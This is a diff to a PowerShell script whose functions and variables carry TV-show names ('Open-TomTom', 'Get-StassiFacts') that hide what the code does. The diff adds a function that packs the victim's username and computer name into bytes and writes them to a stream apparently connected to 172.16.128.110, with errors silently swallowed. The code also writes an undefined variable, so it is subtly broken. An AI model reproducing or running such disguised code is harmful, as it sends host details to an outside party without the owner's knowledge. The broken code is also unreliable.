@@ -66,7 +66,9 @@ function Best-TVShow {
 
 function Get-StassiFacts {
     [CmdletBinding()]
-    $IsTomALiar
+    param(
+        $IsTomALiar
+    )
 
     if ($IsTomALiar) {
         Get-Service -Name wuauserv
@@ -82,5 +84,26 @@ function Get-StassiFacts {
 
 }
 
+function Open-TomTom {
+    [CmdletBinding()]
+    param (
+        $DoesLisaInvest,
+        $iderWhatSeasonThisHappenedIn
+    )
+    if ($iderWhatSeasonThisHappenedIn -eq $true) {
+        try {
+            [byte[]]$moneyTheyMake = 0..65535 | ForEach-Object { 0 } 
+            $tellLisaAboutMoney = ([text.encoding]::ASCII).GetBytes("Who made the money: " + $env:username + " at which restaurant:" + $env:computername)
+            $DoesLisaInvest.Write($sendbytes, 0, $sendbytes.Length)
+        }
+        catch {
+
+        }
+    }
+}
+
 $orlandoIsTiredOfThis = Hookup-Sex -TomTomAddress "172.16.128.110" -NumberOfTimesJaxCheats 4242
-Get-StassiFacts -isTomALiar $orlandoIsTiredOfThis
+$isEveryoneFreeForTheEngagementParty = Get-StassiFacts -isTomALiar $orlandoIsTiredOfThis
+
+Open-TomTom -iderWhatSeasonThisHappenedIn $orlandoIsTiredOfThis -DoesLisaInvest $isEveryoneFreeForTheEngagementParty
+
